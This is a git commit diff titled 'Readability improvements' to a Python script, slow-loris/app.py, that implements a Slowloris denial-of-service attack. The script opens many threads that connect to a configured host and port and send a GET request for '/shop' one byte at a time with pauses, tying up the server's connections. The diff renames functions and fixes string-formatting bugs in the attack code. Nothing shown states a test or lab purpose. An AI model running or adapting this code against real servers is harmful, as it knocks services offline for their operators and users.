2a1504bf00cbd7acd8c1f49470b1a0128ce6bc5f
Arj <arjun.toor@panaseer.com>
2022-07-14 10:44:50 +0100

    Readability improvements

--- slow-loris/app.py
+++ slow-loris/app.py
@@ -1,8 +1,8 @@
-import socket
 import logging
+import os
+import socket
 import threading
 import time
-import os
 
 logging.root.setLevel(logging.DEBUG)
 
@@ -24,34 +24,36 @@ logging.debug(f'HOST={HOST}')
 logging.debug(f'PORT={PORT}')
 
 
-def slow_request(name: str, http_request: str):
-    logging.debug("Sending request (%s), total request size %d bytes", name, len(http_request))
+def slow_loris_attack():
+    get_request = create_simple_get_request("/shop")
+    logging.debug(get_request)
+
+    for request_num in range(NUM_REQUESTS_TO_START):
+        threading.Thread(target=send_very_slowly, args=(str(request_num), get_request,)).start()
+        time.sleep(TIME_BETWEEN_REQUESTS)
+
+
+def create_simple_get_request(path: str):
+    lines = [
+        f"GET {path} HTTP/1.1",
+        f"Accept: text/html",
+        f"Cache-Control: no-cache",
+        f"Connection: keep-alive",
+        f"Host: {HOST}:{PORT}",
+        f""
+    ]
+    return "\r\n".join(lines)
+
+
+def send_very_slowly(num: str, http_request: str):
+    logging.debug("Sending request (%s), total request size %d bytes", num, len(http_request))
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((HOST, PORT))
         for char in http_request:
             s.sendall(str.encode(char))
             time.sleep(TIME_BETWEEN_BYTES)
         data = s.recv(1024)
-    logging.debug('Response for request (%s): %s', name, repr(data))
-
-
-def as_get_request(path: str):
-    lines = [
-        f'GET ${path} HTTP/1.1',
-        'Accept: text/html',
-        'Cache-Control: no-cache',
-        'Connection: keep-alive',
-        f'Host: ${HOST}:${PORT}'
-    ]
-    return '\r\n'.join(lines) + '\r\n'
-
-
-def slow_loris_attack():
-    get_request = as_get_request("/shop")
-
-    for request_num in range(NUM_REQUESTS_TO_START):
-        threading.Thread(target=slow_request, args=(str(request_num), get_request,)).start()
-        time.sleep(TIME_BETWEEN_REQUESTS)
+    logging.debug('Response for request (%s): %s', num, repr(data))
 
 
 if __name__ == '__main__':
